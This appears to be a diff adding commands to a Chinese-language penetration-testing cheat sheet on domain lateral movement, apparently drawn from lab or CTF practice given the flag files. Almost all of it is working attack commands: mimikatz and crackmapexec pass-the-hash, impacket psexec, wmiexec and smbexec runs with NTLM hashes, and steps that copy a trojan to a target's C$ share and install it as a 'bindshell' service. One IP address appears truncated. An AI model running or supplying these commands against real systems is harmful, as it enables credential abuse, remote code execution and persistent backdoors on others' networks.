@@ -1,4 +1,5 @@
 [干货 | 域内敏感信息搜集](https://mp.weixin.qq.com/s/nFOAb__c162gMhve3MEh_Q)
+[横向移动之PTH、PPT、PTK](https://mp.weixin.qq.com/s/uWuNqKYloTQCifKjsXMB2Q)
 
 ## 信息收集
 
@@ -170,6 +171,17 @@ mimikatz.exe "sekurlsa::pth /user:<user name> /domain:<domain name> /ntlm:<the u
 mimikatz.exe "privilege::debug" "sekurlsa::pth /user:WIN2016$ /domain:g1ts /ntlm:19b241fc247a06034210b12ae3aca2d9"
 # pth 读取数据
 proxychains crackmapexec smb 172.22.8.15 -u WIN2016$ -H290b14ec023182beeb4890dbe5b9774b -d xiaorang.lab -x "type Users\Administrator\flag\flag03.txt"
+# pth 攻击
+python psexec.py -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.32 "whoami"
+python wmiexec.py -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32 "whoami"
+python smbexec.py -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32
+```
+
+pth连接后上传马
+```sh
+copy 4444.exe \\192.168.3.32\c$\  # 上传木马到目标机器中
+sc \\192.168.3.32 create bindshell binpath= "c:\4444.exe" # 创建shell服务并绑定文件
+sc \\192.168.3.32 start bindshell # 启动bindshell服务
 ```
 
 ### pth远程桌面登录
